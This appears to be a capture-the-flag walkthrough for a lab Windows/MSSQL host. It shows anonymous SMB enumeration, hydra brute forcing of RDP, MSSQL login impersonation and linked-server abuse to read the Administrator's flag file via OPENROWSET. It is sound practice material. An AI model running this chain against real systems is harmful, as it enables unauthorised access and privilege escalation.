Did an nmap scan 

```
nmap -p- -Pn 10.129.56.105
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-10-07 14:44 UTC
Nmap scan report for 10.129.56.105
Host is up (0.018s latency).
Not shown: 65531 filtered tcp ports (no-response)
PORT     STATE SERVICE
135/tcp  open  msrpc
445/tcp  open  microsoft-ds
1433/tcp open  ms-sql-s
3389/tcp open  ms-wbt-server

Nmap done: 1 IP address (1 host up) scanned in 179.73 seconds
```

Let's try enumerating smb shares anonymously:
```
smbclient -N -L \\\\10.129.56.105

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        Home            Disk      
        IPC$            IPC       Remote IPC
SMB1 disabled -- no workgroup available
```

The `Home` share sheems interesting.. Let's try logging in anonymously.
```
smbclient -N  \\\\10.129.56.105\\Home
#Or mount it
sudo mount -t cifs //10.129.56.105/Home ./mount 
```

The `IT` folder seems to have plenty of usefull information we can use to guess a password.
Compiled a file `user.list` and `password.list` to use with hydra.

```
hydra -L user.list -P password.list rdp://10.129.56.105
```
We have a hit for user `fiona` with password `48Ns72!bns74@S84NNNSl`

We can open SSMS login as `fiona` to the sql instance WIN-HARD (after finding it via browse feature in SSMS)


We can open SSMS login as `fiona` to the sql instance WIN-HARD (after finding it via browse feature in SSMS)

Running the below command we can see who we can impersonate:
```sql
SELECT distinct b.name
FROM sys.server_permissions a
INNER JOIN sys.server_principals b
ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE'
```
The query returns we can impersonate `simon` and `john`

First use `TestAppDB` then run this query:
```sql
EXECUTE AS LOGIN = 'simon';
USE TestAppDB
SELECT USER_NAME();
SELECT TABLE_SCHEMA, TABLE_NAME
FROM INFORMATION_SCHEMA.TABLES
WHERE TABLE_TYPE = 'BASE TABLE';
Select * from tb_users
```

This returns following result
```
username password       privileges
patric	Testuser123!	user
julio	Testadmin123!	admin
```
After some searching the above seems to lead us nowhere.

We move on by checking for linked servers
```sql
SELECT srvname, isremote FROM sysservers

--which returns:
srvname                 isremote
WINSRV02\SQLEXPRESS	1
LOCAL.TEST.LINKED.SRV	0
```

We can then try impersonating john and executing a command on the linked server. It seems we are admin here.
```
EXECUTE AS LOGIN = 'john'
EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [LOCAL.TEST.LINKED.SRV]
```

We can now just read the flag from the desktop

```
EXECUTE('SELECT * FROM OPENROWSET(BULK N''C:/Users/Administrator/Desktop/flag.txt'', SINGLE_CLOB) AS Contents') AT [LOCAL.TEST.LINKED.SRV]
```


